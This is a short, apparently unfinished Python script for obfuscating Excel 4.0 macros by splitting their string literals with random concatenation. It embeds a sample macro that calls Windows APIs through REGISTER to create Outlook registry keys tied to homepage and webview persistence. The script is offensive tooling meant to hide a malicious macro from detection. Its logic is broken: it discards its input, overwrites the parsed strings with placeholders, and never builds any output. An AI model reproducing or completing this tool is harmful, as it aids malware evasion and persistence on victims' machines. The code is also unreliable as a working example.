import re
import random

def obfuscate(macro_body):
    macro_body = """
=REGISTER("kernel32", "localalloc", "JJJ", "alloc", , 1, 9)
=alloc(64, 8)
=REGISTER("advapi32", "RegCreateKeyA", "JJCN", "CreateKey", , 1, 9)
=CreateKey(-2147483647, "Software\Microsoft\Office\16.0\Outlook\Security\EnableRoamingFolderHomepages",R2C1)
=CreateKey(-2147483647, "Software\Microsoft\Office\16.0\Outlook\Webview\Inbox",R2C1)
=REGISTER("Advapi32", "RegSetKeyValueA", "JJCCJNJ", "SetKeyValueDWORD", , 1, 9)
"""
    concatenator = '"&"'
    for line in macro_body.splitlines(): 
        pattern = r'"([A-Za-z0-9_\./\\-]*)"'
        strings = re.findall(pattern, line)
        strings = ['aaaabbbbcccddeeffggh', 'abcegasfa']
        rand1 = random.randint(1,3)
        count = rand1
        previous = strings[0][0:rand1]
        for string in strings:
            while(True): 
                if count > len(string): 
                    break
                previous += concatenator
                rand2 = random.randint(1,2)
                next = string[rand1:rand2]
                rand1 = random.randint(1,3)
                count += rand2


            



obfuscate("")